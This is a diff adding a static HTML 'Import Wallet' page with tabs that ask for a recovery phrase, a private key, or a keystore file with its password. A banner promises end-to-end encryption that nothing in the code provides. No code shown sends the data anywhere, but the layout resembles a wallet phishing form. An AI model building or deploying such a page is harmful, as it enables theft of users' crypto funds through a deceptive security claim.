@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Import Wallet</title>
+  <style>
+    /* Basic Reset */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #0d1117;
+      color: #c9d1d9;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px;
+    }
+
+    header {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    header h1 {
+      font-size: 2rem;
+      color: #58a6ff;
+    }
+
+    header p {
+      margin-top: 10px;
+      font-size: 0.9rem;
+      color: #8b949e;
+    }
+
+    .container {
+      background-color: #161b22;
+      border-radius: 8px;
+      padding: 20px;
+      width: 100%;
+      max-width: 500px;
+      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
+    }
+
+    .tabs {
+      display: flex;
+      justify-content: space-around;
+      margin-bottom: 20px;
+    }
+
+    .tab {
+      padding: 10px 15px;
+      background-color: #21262d;
+      border: none;
+      border-radius: 5px;
+      color: #c9d1d9;
+      cursor: pointer;
+      font-size: 1rem;
+      transition: background-color 0.3s ease;
+    }
+
+    .tab.active {
+      background-color: #58a6ff;
+      color: #0d1117;
+    }
+
+    .tab:hover {
+      background-color: #3b82f6;
+    }
+
+    .form {
+      display: none;
+    }
+
+    .form.active {
+      display: block;
+    }
+
+    textarea,
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #30363d;
+      border-radius: 5px;
+      background-color: #0d1117;
+      color: #c9d1d9;
+      font-size: 1rem;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #58a6ff;
+      border: none;
+      border-radius: 5px;
+      color: #0d1117;
+      font-size: 1rem;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #3b82f6;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Import Wallet</h1>
+    <p>NB: All information is end-to-end encrypted. We do not share data or activity sessions with any other company.</p>
+  </header>
+
+  <div class="container">
+    <!-- Tabs -->
+    <div class="tabs">
+      <button class="tab active" data-target="phrase-form">Phrase</button>
+      <button class="tab" data-target="private-key-form">Private Key</button>
+      <button class="tab" data-target="keystore-json-form">Keystore JSON</button>
+    </div>
+
+    <!-- Forms -->
+    <div id="phrase-form" class="form active">
+      <label for="recovery-phrase">Recovery Phrase</label>
+      <textarea id="recovery-phrase" rows="4" placeholder="Typically 12 (sometimes 24) words separated by a single space."></textarea>
+      <button>Import Wallet</button>
+    </div>
+
+    <div id="private-key-form" class="form">
+      <label for="private-key">Private Key</label>
+      <textarea id="private-key" rows="4" placeholder="Enter your private key"></textarea>
+      <button>Import Wallet</button>
+    </div>
+
+    <div id="keystore-json-form" class="form">
+      <label for="keystore-json">Keystore JSON</label>
+      <textarea id="keystore-json" rows="4" placeholder="Paste your keystore JSON"></textarea>
+      <label for="keystore-password">Password</label>
+      <input type="password" id="keystore-password" placeholder="Enter your password">
+      <button>Import Wallet</button>
+    </div>
+  </div>
+
+  <script>
+    const tabs = document.querySelectorAll('.tab');
+    const forms = document.querySelectorAll('.form');
+
+    tabs.forEach(tab => {
+      tab.addEventListener('click', () => {
+        // Remove active class from all tabs and forms
+        tabs.forEach(t => t.classList.remove('active'));
+        forms.forEach(f => f.classList.remove('active'));
+
+        // Add active class to the clicked tab and its corresponding form
+        tab.classList.add('active');
+        const target = tab.getAttribute('data-target');
+        document.getElementById(target).classList.add('active');
+      });
+    });
+  </script>
+</body>
+</html>
